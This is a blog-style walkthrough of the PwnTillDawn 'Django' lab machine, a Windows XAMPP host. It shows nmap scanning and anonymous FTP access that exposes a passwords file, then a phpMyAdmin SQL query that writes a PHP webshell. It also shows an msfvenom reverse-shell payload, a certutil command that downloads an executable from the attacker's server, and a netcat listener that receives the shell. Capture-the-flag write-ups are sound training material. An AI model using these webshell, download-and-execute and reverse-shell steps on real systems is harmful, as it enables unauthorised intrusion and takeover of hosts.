+++ 
author = ['Abdallah Adham']
title = "Django PwnTillDawn Writeup"
date = 2022-12-05
description = "This is a writeup of the Django machine in PwnTillDawn Online platform."
draft = false
slug = ""

tags = [
	'PwnTillDawn',
    'PenTesting',  
    'Web', 
    'Exploit', 
    'Vulnerability',]

categories = [
    'Pen-Testing',  
    'Web-Security',
    ]

image = "post/Django_PwnTillDawn/django_pwntilldawn.JPG"
+++

---

This writeup has been authorized by the **PwnTillDawn Crew**! 

Check their websites for more information!
1. [wizlynxgroup](https://www.wizlynxgroup.com/)
2. [online.pwntilldawn](https://online.pwntilldawn.com/)

## Target Information

| Name | IP | Operating System | Difficulty| 
|----------- | ----------- | ----------- |  -----------|
|**Django**| **10.150.150.212** | **Windows** | **Easy** |

## Scanning

### Nmap Scanning

```bash
Nmap scan report for 10.150.150.212
Host is up (0.083s latency).
Not shown: 986 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
21/tcp    open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220-Wellcome to Home Ftp Server!
|     Server ready.
|     command not understood.
|     command not understood.
|   Help: 
|     220-Wellcome to Home Ftp Server!
|     Server ready.
|     'HELP': command not understood.
|   NULL, SMBProgNeg: 
|     220-Wellcome to Home Ftp Server!
|     Server ready.
|   SSLSessionReq: 
|     220-Wellcome to Home Ftp Server!
|     Server ready.
|_    command not understood.
| ftp-syst: 
|_  SYST: Internet Component Suite
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drw-rw-rw-   1 ftp      ftp            0 Mar 26  2019 . [NSE: writeable]
| drw-rw-rw-   1 ftp      ftp            0 Mar 26  2019 .. [NSE: writeable]
| drw-rw-rw-   1 ftp      ftp            0 Mar 13  2019 FLAG [NSE: writeable]
| -rw-rw-rw-   1 ftp      ftp        34419 Mar 26  2019 xampp-control.log [NSE: writeable]
|_-rw-rw-rw-   1 ftp      ftp          881 Nov 13  2018 zen.txt [NSE: writeable]
|_ftp-bounce: bounce working!
80/tcp    open  http         Apache httpd 2.4.34 ((Win32) OpenSSL/1.0.2o PHP/5.6.38)
|_http-server-header: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.38
| http-title: Welcome to XAMPP
|_Requested resource was http://10.150.150.212/dashboard/
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.34 ((Win32) OpenSSL/1.0.2o PHP/5.6.38)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.34 (Win32) OpenSSL/1.0.2o PHP/5.6.38
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| http-title: Welcome to XAMPP
|_Requested resource was https://10.150.150.212/dashboard/
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: PWNTILLDAWN)
3306/tcp  open  mysql        MariaDB (unauthorized)
8089/tcp  open  ssl/http     Splunkd httpd
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-10-29T14:31:26
|_Not valid after:  2022-10-28T14:31:26
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.93%I=7%D=11/14%Time=63727F72%P=x86_64-pc-linux-gnu%r(NUL
SF:L,35,"220-Wellcome\x20to\x20Home\x20Ftp\x20Server!\r\n220\x20Server\x20
SF:ready\.\r\n")%r(GenericLines,79,"220-Wellcome\x20to\x20Home\x20Ftp\x20S
SF:erver!\r\n220\x20Server\x20ready\.\r\n500\x20'\r':\x20command\x20not\x2
SF:0understood\.\r\n500\x20'\r':\x20command\x20not\x20understood\.\r\n")%r
SF:(Help,5A,"220-Wellcome\x20to\x20Home\x20Ftp\x20Server!\r\n220\x20Server
SF:\x20ready\.\r\n500\x20'HELP':\x20command\x20not\x20understood\.\r\n")%r
SF:(SSLSessionReq,89,"220-Wellcome\x20to\x20Home\x20Ftp\x20Server!\r\n220\
SF:x20Server\x20ready\.\r\n500\x20'\x16\x03\0\0S\x01\0\0O\x03\0\?G\xd7\xf7
SF:\xba,\xee\xea\xb2`~\xf3\0\xfd\x82{\xb9\xd5\x96\xc8w\x9b\xe6\xc4\xdb<=\x
SF:dbo\xef\x10n\0\0\(\0\x16\0\x13\0':\x20command\x20not\x20understood\.\r\
SF:n")%r(SMBProgNeg,35,"220-Wellcome\x20to\x20Home\x20Ftp\x20Server!\r\n22
SF:0\x20Server\x20ready\.\r\n");
Service Info: Hosts: Wellcome, DJANGO; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: Django
|   NetBIOS computer name: DJANGO\x00
|   Workgroup: PWNTILLDAWN\x00
|_  System time: 2022-11-14T18:33:30+00:00
| smb2-time: 
|   date: 2022-11-14T18:33:32
|_  start_date: 2020-04-02T14:41:43
|_clock-skew: mean: 41m34s, deviation: 40s, median: 41m10s
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

## Enumeration

### FTP Enumeration

Let's get a look at the **FTP server**, As it says that **anonymous** login is allowed from the **Nmap** scanner report.

```bash
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

```bash
─$ ftp 10.150.150.212                                                                                      
Connected to 10.150.150.212.
220-Wellcome to Home Ftp Server!
220 Server ready.
Name (10.150.150.212:pyke): anonymous
331 Password required for anonymous.
Password: 
230 User Anonymous logged in.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> help
Commands may be abbreviated.  Commands are:

!               cr              ftp             macdef          msend           prompt          restart         sunique
$               debug           gate            mdelete         newer           proxy           rhelp           system
account         delete          get             mdir            nlist           put             rmdir           tenex
append          dir             glob            mget            nmap            pwd             rstatus         throttle
ascii           disconnect      hash            mkdir           ntrans          quit            runique         trace
bell            edit            help            mls             open            quote           send            type
binary          epsv            idle            mlsd            page            rate            sendport        umask
bye             epsv4           image           mlst            passive         rcvbuf          set             unset
case            epsv6           lcd             mode            pdir            recv            site            usage
cd              exit            less            modtime         pls             reget           size            user
cdup            features        lpage           more            pmlsd           remopts         sndbuf          verbose
chmod           fget            lpwd            mput            preserve        rename          status          xferbuf
close           form            ls              mreget          progress        reset           struct          ?
ftp> dir
227 Entering Passive Mode (10,150,150,212,192,51).
150 Opening data connection for directory list.
drw-rw-rw-   1 ftp      ftp            0 Mar 26  2019 .
drw-rw-rw-   1 ftp      ftp            0 Mar 26  2019 ..
drw-rw-rw-   1 ftp      ftp            0 Mar 13  2019 FLAG
-rw-rw-rw-   1 ftp      ftp        34419 Mar 26  2019 xampp-control.log
-rw-rw-rw-   1 ftp      ftp          881 Nov 13  2018 zen.txt
226 File sent ok
ftp> get FLAG
local: FLAG remote: FLAG
227 Entering Passive Mode (10,150,150,212,192,52).
501 Cannot RETR. File not found
ftp> get xampp-control.log
local: xampp-control.log remote: xampp-control.log
227 Entering Passive Mode (10,150,150,212,192,54).
150 Opening data connection for xampp-control.log.
100% |**********************************************************************************************| 34419      102.16 KiB/s    00:00 ETA
226 File sent ok
34419 bytes received in 00:00 (87.50 KiB/s)
ftp> get zen.txt
local: zen.txt remote: zen.txt
227 Entering Passive Mode (10,150,150,212,192,55).
150 Opening data connection for zen.txt.
100% |**********************************************************************************************|   881       36.68 KiB/s    00:00 ETA
226 File sent ok
881 bytes received in 00:00 (10.28 KiB/s)
```

We have managed to download two files which are `zen.txt` and `xampp-control.log`.

Also, There is a directory called `FLAG` that has one of the flags in it!

```bash
ftp> ls
227 Entering Passive Mode (10,150,150,212,192,59).
150 Opening data connection for directory list.
drw-rw-rw-   1 ftp      ftp            0 Mar 26  2019 .
drw-rw-rw-   1 ftp      ftp            0 Mar 26  2019 ..
drw-rw-rw-   1 ftp      ftp            0 Mar 13  2019 FLAG
-rw-rw-rw-   1 ftp      ftp        34419 Mar 26  2019 xampp-control.log
-rw-rw-rw-   1 ftp      ftp          881 Nov 13  2018 zen.txt
226 File sent ok
ftp> cd FLAG
250 CWD command successful. "/FLAG" is current directory.
ftp> ls
227 Entering Passive Mode (10,150,150,212,192,60).
150 Opening data connection for directory list.
drw-rw-rw-   1 ftp      ftp            0 Mar 13  2019 .
drw-rw-rw-   1 ftp      ftp            0 Mar 13  2019 ..
-rw-rw-rw-   1 ftp      ftp           40 Mar 13  2019 FLAG19.txt
226 File sent ok
ftp> get FLAG19.txt
local: FLAG19.txt remote: FLAG19.txt
227 Entering Passive Mode (10,150,150,212,192,62).
150 Opening data connection for FLAG19.txt.
100% |**********************************************************************************************|    40      797.19 KiB/s    00:00 ETA
226 File sent ok
40 bytes received in 00:00 (0.58 KiB/s)
```

Let's see what is in them?

1. FLAG19.txt
```bash
$ cat FLAG19.txt 
a393b6fb540379e942b00XXXXXXXXXXXXXXXXXX
```

2. zen.txt
```bash
$ cat zen.txt   
The Zen of Python
==================

Beautiful is better than ugly.
Explicit is better than implicit.
Simple is better than complex.
Complex is better than complicated.
Flat is better than nested.
Sparse is better than dense.
Readability counts.
Special cases aren't special enough to break the rules.
Although practicality beats purity.
Errors should never pass silently.
Unless explicitly silenced.
In the face of ambiguity, refuse the temptation to guess.
There should be one-- and preferably only one --obvious way to do it.
Although that way may not be obvious at first unless you're Dutch.
Now is better than never.
Although never is often better than *right* now.
If the implementation is hard to explain, it's a bad idea.
If the implementation is easy to explain, it may be a good idea.
Namespaces are one honking great idea -- let's do more of those!
```

3. xampp-control.log
```bash
$ cat xampp-control.log 
3:11:25 PM  [main]      Initializing Control Panel
3:11:25 PM  [main]      Windows Version: Windows 7 Home Basic  64-bit
3:11:25 PM  [main]      XAMPP Version: 5.6.38
3:11:25 PM  [main]      Control Panel Version: 3.2.2  [ Compiled: Nov 12th 2015 ]
3:11:25 PM  [main]      You are not running with administrator rights! This will work for
3:11:25 PM  [main]      most application stuff but whenever you do something with services
3:11:25 PM  [main]      there will be a security dialogue or things will break! So think 
3:11:25 PM  [main]      about running this application with administrator rights!
3:11:25 PM  [main]      XAMPP Installation Directory: "c:\xampp\"
3:11:25 PM  [main]      XAMPP Password Written in: "c:\xampp\passwords.txt"
```

By looking into `xampp-control.log` we can see the below line which we can get with the **FTP** service.


```bash
3:11:25 PM  [main]      XAMPP Password Written in: "c:\xampp\passwords.txt"
```

```bash
ftp> get "c:\xampp\passwords.txt"
local: c:\xampp\passwords.txt remote: c:\xampp\passwords.txt
227 Entering Passive Mode (10,150,150,212,192,68).
150 Opening data connection for c:\xampp\passwords.txt.
100% |**********************************************************************************************|   816       32.58 KiB/s    00:00 ETA
226 File sent ok
816 bytes received in 00:00 (9.44 KiB/s)
```

Also, We can find the `FLAG20.txt` in the home directory of **XAMPP server** at `c:\xampp\`

```bash
ftp> dir "c:\xampp\"
227 Entering Passive Mode (10,150,150,212,192,74).
150 Opening data connection for directory list.

-rw-rw-rw-   1 ftp      ftp           40 Mar 13  2019 FLAG20.txt
drw-rw-rw-   1 ftp      ftp            0 Nov 12  2018 mysql
-rwxrwxrwx   1 ftp      ftp          481 Jun 07  2013 mysql_start.bat
-rwxrwxrwx   1 ftp      ftp          220 Jun 07  2013 mysql_stop.bat
-rw-rw-rw-   1 ftp      ftp          816 Mar 13  2019 passwords.txt
drw-rw-rw-   1 ftp      ftp            0 Nov 12  2018 perl
drw-rw-rw-   1 ftp      ftp            0 Nov 12  2018 php
drw-rw-rw-   1 ftp      ftp            0 Nov 12  2018 phpMyAdmin
226 File sent ok
ftp> get "c:\xampp\FLAG20.txt"
local: c:\xampp\FLAG20.txt remote: c:\xampp\FLAG20.txt
227 Entering Passive Mode (10,150,150,212,192,75).
150 Opening data connection for c:\xampp\FLAG20.txt.
100% |**********************************************************************************************|    40      271.26 KiB/s    00:00 ETA
226 File sent ok
40 bytes received in 00:00 (0.49 KiB/s)
```

Also, We can see that there is `phpMyAdmin` directory that we can investigate at the **HTTP enumeration** section.

Now Let's see what is inside the `passwords.txt` and the `FLAG20.txt`?

1. FLAG20.txt
```bash
$ cat c:\\xampp\\FLAG20.txt
a9435c140b6667cf2f24fXXXXXXXXXXXXXXXXXXX
```

2. passwords.txt
```bash
─$ cat 'c:\xampp\passwords.txt'
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:thebarrierbetween

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords).
```

So, Now we have the credientials for the `phpMyAdmin` login at the webpage.
```bash
MySQL (phpMyAdmin):
   User: root
   Password:thebarrierbetween
```

Let's see it!

### HTTP Enumeration

![http](post/Django_PwnTillDawn/imgs/1.JPG)


By looking at the webpage it looks as **XAMPP Apache** for hosting this website.

Let's go to the `phpMyAdmin` directory!

![phpmyadmin](post/Django_PwnTillDawn/imgs/2.JPG)

Let's log in using the credientials we've found in the FTP server!

![phpmyadmin2](post/Django_PwnTillDawn/imgs/3.JPG)

After we've logged in we go to the `Databases` tab and we can see the **flag18** is there.

![databases](post/Django_PwnTillDawn/imgs/4.JPG)

After that we can upload a **webshell** in the **SQL** tab using SQL quaries.

## Exploitation

### PHP Webshell

I came through that [article](https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/)that shows the steps we are going to follow in order to get a full reverse shell to the machine.

1. We go to the **SQL** tab.
![SQL_tab](post/Django_PwnTillDawn/imgs/5.JPG)

2. Then, We upload the **PHP webshell** backdoor.
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```

![SQL_tab2](post/Django_PwnTillDawn/imgs/6.JPG)

3. Then, We go the **PHP webshell** place and execute arbitary commands.

![php_webshell](post/Django_PwnTillDawn/imgs/7.JPG)

4. After that, We need to upload a **Reverse shell payload** at the victim's machine and then run it to get the **RevShell**.

5. Make the RevShell payload using **MsVenom**.
```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.66.X.X LPORT=4444 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
```

6. Then, Setup a **Python server** to upload that payload in the victim's machine.
```bash
$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
```

7. Now, Upload the **RevShell** payload using **Certutils.exe**.
```powershell
Certutils.exe:
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
```

8. Now, We edit it to suit our case and upload the payload.
![certutils.exe](post/Django_PwnTillDawn/imgs/8.JPG)

![certutils.exe2](post/Django_PwnTillDawn/imgs/9.JPG)

9. Now, We can setup a **Netcat Listener** and get a **Reverse Shell** after we run the payload.
```bash
$ nc -nlvp 4444
listening on [any] 4444 ...
```

Now, We run the payload and hopefully we can get the **RevShell**.

![revshell](post/Django_PwnTillDawn/imgs/10.JPG)


10. Boom! We are in!
```powershell
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.66.66.154] from (UNKNOWN) [10.150.150.212] 49375
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
C:\xampp\htdocs>whoami
whoami
django\chuck.norris
```

## Post-Exploitation

By navigating through users directory, I have found the last flag `FLAG11.txt` in Desktop folder of `chuck.norris` user.

```powershell
C:\Users\chuck.norris>cd Desktop
cd Desktop

C:\Users\chuck.norris\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3829-EAA8

 Directory of C:\Users\chuck.norris\Desktop

02/05/2019  10:41 AM    <DIR>          .
02/05/2019  10:41 AM    <DIR>          ..
02/05/2019  10:40 AM                40 FLAG11.txt
               1 File(s)             40 bytes
               2 Dir(s)   3,862,536,192 bytes free
C:\Users\chuck.norris\Desktop>type FLAG11.txt
type FLAG11.txt
7a763d39f68ece1edd10XXXXXXXXXXXXXXXXXXX
```

_Pwned_

![pwned](post/Django_PwnTillDawn/imgs/11.JPG)

